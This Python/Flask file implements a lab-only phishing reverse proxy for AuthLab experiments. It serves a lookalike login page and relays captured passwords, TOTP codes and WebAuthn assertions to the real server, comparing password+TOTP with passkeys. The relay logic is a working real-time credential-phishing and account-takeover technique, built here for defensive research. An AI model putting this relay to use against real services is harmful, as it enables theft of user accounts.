"""A deliberately hostile reverse proxy used only in the lab.

It serves a lookalike page on ``evil.app.lvh.me`` and relays credentials and
WebAuthn assertions to the real AuthLab server on ``app.lvh.me``.  This lets
the experiments compare:

* password + TOTP: the proxy can capture and immediately replay both factors;
* passkeys / hardware keys: the browser will sign over the *phishing* origin,
  so a correct verifier must reject the assertion.

The proxy is a research instrument.  It is not hardened and must only be run
on loopback with disposable test accounts.
"""
from __future__ import annotations

import secrets
import threading
import time

import requests
from flask import Flask, jsonify, request

PAGE = r"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>AuthLab Account — sign in</title>
<style>
  :root { color-scheme: dark; }
  body { margin:0; min-height:100vh; display:grid; place-items:center;
    background:radial-gradient(900px 500px at 30% -10%,#17335a,transparent),#0b1020;
    color:#e8ecf8; font:16px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }
  .phish { width:min(460px,92vw); background:#121a33; border:1px solid #26325a;
    border-radius:18px; padding:28px; box-shadow:0 20px 60px #0008; }
  .banner { background:#3b1d24; border:1px solid #7f1d1d; color:#fecdd3;
    padding:8px 10px; border-radius:8px; font-size:12px; margin-bottom:18px; }
  h1 { font-size:24px; margin:0 0 4px; letter-spacing:-.03em; }
  .muted { color:#9aa6c8; font-size:13px; }
  label { display:block; font-size:12px; color:#9aa6c8; margin:12px 0 5px; }
  input { width:100%; box-sizing:border-box; padding:10px 12px; border-radius:9px;
    border:1px solid #26325a; background:#0e1529; color:#e8ecf8; font:inherit; }
  button { margin-top:14px; width:100%; padding:10px 12px; border-radius:9px; border:1px solid #6ee7b7;
    background:#6ee7b7; color:#062018; font:inherit; font-weight:700; cursor:pointer; }
  button.secondary { background:#182244; color:#e8ecf8; border-color:#26325a; }
  .row { display:flex; gap:8px; }
  .row button { width:auto; flex:1; }
  #phish-status { min-height:22px; margin-top:12px; font-size:13px; color:#9aa6c8; white-space:pre-wrap; }
  .ok { color:#6ee7b7; } .bad { color:#fda4af; }
  code { color:#93c5fd; }
</style></head>
<body>
<div class="phish">
  <div class="banner">RESEARCH PHISHING SIMULATION · evil.app.lvh.me · not a real login</div>
  <h1>Sign in to AuthLab</h1>
  <p class="muted">This page is controlled by the experiment harness.</p>

  <form id="phish-password-form">
    <label for="phish-username">Username</label>
    <input id="phish-username" autocomplete="username" required>
    <label for="phish-password">Password</label>
    <input id="phish-password" type="password" autocomplete="current-password" required>
    <label for="phish-totp">TOTP code</label>
    <input id="phish-totp" inputmode="numeric" autocomplete="one-time-code" required>
    <button id="phish-password-submit" type="submit">Sign in with password + TOTP</button>
  </form>

  <div class="row">
    <button id="phish-passkey" class="secondary" type="button">Passkey</button>
    <button id="phish-hardware" class="secondary" type="button">Security key</button>
  </div>
  <button id="phish-naive" class="secondary" type="button">Naive lookalike (wrong RP ID)</button>
  <div id="phish-status" aria-live="polite"></div>
</div>
<script>
const b64u = {
  enc(buf) { const b=new Uint8Array(buf); let s=""; for (const x of b) s+=String.fromCharCode(x);
    return btoa(s).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/g,""); },
  dec(text) { const p=text.length%4===0?"":"=".repeat(4-(text.length%4));
    const s=atob(text.replace(/-/g,"+").replace(/_/g,"/")+p);
    return Uint8Array.from(s,c=>c.charCodeAt(0)); }
};
async function post(url, body) {
  const r = await fetch(url, {method:"POST", headers:{"Content-Type":"application/json"},
    credentials:"same-origin", body:JSON.stringify(body||{})});
  return await r.json();
}
function setStatus(text, cls) {
  const el=document.getElementById("phish-status"); el.textContent=text;
  el.className=cls||"";
}
function ser(cred) {
  return {id:cred.id, rawId:b64u.enc(cred.rawId), type:cred.type,
    response:{clientDataJSON:b64u.enc(cred.response.clientDataJSON),
      authenticatorData:b64u.enc(cred.response.authenticatorData),
      signature:b64u.enc(cred.response.signature),
      userHandle:cred.response.userHandle?b64u.enc(cred.response.userHandle):null}};
}
function policy() { return new URLSearchParams(location.search).get("policy") || "strict"; }

document.getElementById("phish-password-form").addEventListener("submit", async e => {
  e.preventDefault();
  setStatus("Relaying credentials…");
  const t0=performance.now();
  try {
    const data=await post("/phish/password", {
      username:document.getElementById("phish-username").value,
      password:document.getElementById("phish-password").value,
      totp:document.getElementById("phish-totp").value,
      policy:policy()
    });
    window.__phish = {kind:"password_totp", ...data};
    setStatus((data.ok ? "ACCOUNT TAKEOVER: " : "Blocked: ") + "stage=" + data.stage +
      " in " + Math.round(data.elapsed_ms) + " ms", data.ok ? "ok" : "bad");
  } catch (err) { setStatus("Error: " + err.message, "bad"); }
});

async function relay(kind) {
  setStatus("Requesting real challenge and relaying…");
  try {
    const opt=await post("/phish/webauthn/options", {
      kind:kind,
      username:document.getElementById("phish-username").value,
      policy:policy()
    });
    if (!opt.ok) { setStatus("Proxy error: " + (opt.error||"unknown"), "bad"); return; }
    const pk=Object.assign({}, opt.options);
    pk.challenge=b64u.dec(pk.challenge);
    pk.allowCredentials=(pk.allowCredentials||[]).map(c=>Object.assign({},c,{id:b64u.dec(c.id)}));
    pk.timeout=8000;
    const cred=await navigator.credentials.get({publicKey:pk});
    const data=await post("/phish/webauthn/verify", {
      phish_id:opt.phish_id, flow_id:opt.flow_id, credential:ser(cred), policy:policy()
    });
    window.__phish = {kind:kind, ...data};
    setStatus((data.ok ? "ACCOUNT TAKEOVER: " : "Blocked: ") +
      (data.error || ("origin=" + data.origin)) + " in " +
      Math.round(data.elapsed_ms) + " ms", data.ok ? "ok" : "bad");
  } catch (err) {
    window.__phish = {kind:kind, ok:false, error:err.name+": "+err.message};
    setStatus("Blocked: " + (err.name || err.message), "bad");
  }
}

async function naive() {
  setStatus("Trying attacker RP ID with no relayed challenge…");
  try {
    const challenge=crypto.getRandomValues(new Uint8Array(32));
    await navigator.credentials.get({publicKey:{challenge:challenge,
      rpId:location.hostname, userVerification:"required", timeout:3000}});
    window.__phish={kind:"naive",ok:true};
    setStatus("UNEXPECTED: credential found for attacker RP ID", "bad");
  } catch (err) {
    window.__phish={kind:"naive",ok:false,error:err.name+": "+err.message};
    setStatus("Blocked: " + (err.name || err.message), "ok");
  }
}

document.getElementById("phish-passkey").addEventListener("click", () => relay("passkey"));
document.getElementById("phish-hardware").addEventListener("click", () => relay("hardware"));
document.getElementById("phish-naive").addEventListener("click", naive);
</script>
</body></html>"""


def create_phishing_app(real_base: str, lab_token: str) -> Flask:
    app = Flask(__name__)
    app.config["REAL_BASE"] = real_base.rstrip("/")
    app.config["LAB_TOKEN"] = lab_token
    states: dict[str, dict] = {}
    lock = threading.Lock()

    @app.get("/")
    def index():
        return PAGE

    @app.post("/phish/password")
    def phish_password():
        data = request.get_json(silent=True) or {}
        username = str(data.get("username") or "")
        password = str(data.get("password") or "")
        totp = str(data.get("totp") or "")
        policy = str(data.get("policy") or "strict")
        delay = float(data.get("delay") or 0)
        real = app.config["REAL_BASE"]
        t0 = time.perf_counter()
        session = requests.Session()
        session.trust_env = False
        try:
            first = session.post(
                real + "/login/password",
                data={"username": username, "password": password},
                timeout=10, allow_redirects=True,
            )
            stage = "password"
            final = first
            if "/login/totp" in first.url:
                if delay:
                    time.sleep(delay)
                final = session.post(
                    real + "/login/totp", data={"code": totp},
                    timeout=10, allow_redirects=True,
                )
                stage = "totp"
            success = "/dashboard" in final.url and final.status_code < 400
            return jsonify(
                ok=success, stage=stage, policy=policy,
                final_url=final.url, status_code=final.status_code,
                elapsed_ms=(time.perf_counter() - t0) * 1000,
                captured={"username": username, "password": password, "totp": totp},
            )
        except Exception as exc:  # network/proxy failure
            return jsonify(ok=False, stage="exception", error=str(exc),
                           elapsed_ms=(time.perf_counter() - t0) * 1000), 502

    @app.post("/phish/webauthn/options")
    def webauthn_options():
        data = request.get_json(silent=True) or {}
        kind = str(data.get("kind") or "passkey")
        username = str(data.get("username") or "") or None
        policy = str(data.get("policy") or "strict")
        real = app.config["REAL_BASE"]
        session = requests.Session()
        session.trust_env = False
        try:
            response = session.post(
                real + "/webauthn/login/options",
                json={"kind": kind, "username": username}, timeout=10,
            )
            payload = response.json()
            if not response.ok or not payload.get("ok"):
                return jsonify(ok=False, error=payload.get("error", "options_failed")), 502
            phish_id = secrets.token_urlsafe(18)
            with lock:
                states[phish_id] = {
                    "session": session, "policy": policy,
                    "kind": kind, "created": time.time(),
                }
            return jsonify(ok=True, phish_id=phish_id,
                           flow_id=payload["flow_id"], options=payload["options"])
        except Exception as exc:
            return jsonify(ok=False, error=str(exc)), 502

    @app.post("/phish/webauthn/verify")
    def webauthn_verify():
        data = request.get_json(silent=True) or {}
        phish_id = str(data.get("phish_id") or "")
        with lock:
            state = states.get(phish_id)
        if state is None:
            return jsonify(ok=False, error="unknown_phish_id"), 400
        policy = str(data.get("policy") or state["policy"])
        real = app.config["REAL_BASE"]
        session = state["session"]
        t0 = time.perf_counter()
        try:
            response = session.post(
                real + "/lab/webauthn/login/verify",
                json={"flow_id": data.get("flow_id"),
                      "credential": data.get("credential"),
                      "policy": policy},
                headers={"X-AuthLab-Lab": app.config["LAB_TOKEN"]},
                timeout=10,
            )
            payload = response.json()
            ok = bool(response.ok and payload.get("ok"))
            dashboard_status = None
            if ok:
                dash = session.get(real + "/dashboard", timeout=10)
                dashboard_status = dash.status_code
                ok = dash.status_code == 200
            return jsonify(
                ok=ok, policy=policy, verify_status=response.status_code,
                error=payload.get("error"), origin=payload.get("origin"),
                method=payload.get("method"), dashboard_status=dashboard_status,
                elapsed_ms=(time.perf_counter() - t0) * 1000,
            )
        except Exception as exc:
            return jsonify(ok=False, error=str(exc),
                           elapsed_ms=(time.perf_counter() - t0) * 1000), 502

    return app
